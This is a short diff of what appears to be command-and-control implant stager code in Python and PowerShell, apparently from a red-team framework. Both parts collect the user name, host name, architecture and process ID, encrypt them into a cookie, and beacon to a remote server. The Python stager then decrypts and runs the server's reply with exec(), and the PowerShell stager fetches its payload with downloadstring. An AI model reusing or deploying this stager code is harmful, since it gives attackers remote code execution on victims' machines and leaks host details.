@@ -66,7 +66,7 @@ else: sys.exit(0)
 un=pwd.getpwuid( os.getuid() )[ 0 ];pid=os.getpid()
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
-encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid))
+encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;%%s' %% (un,hn,hn,arch,pid,serverclean))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x)
@@ -139,7 +139,7 @@ $wc.Proxy.Credentials = $wc.Credentials;
 $wc } 
 function primer {
 try{$u=([Security.Principal.WindowsIdentity]::GetCurrent()).name} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
-$o="$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;%s"
+$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;%s"
 $pp=enc -key %s -un $o
 $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
 $p = dec -key %s -enc $primer
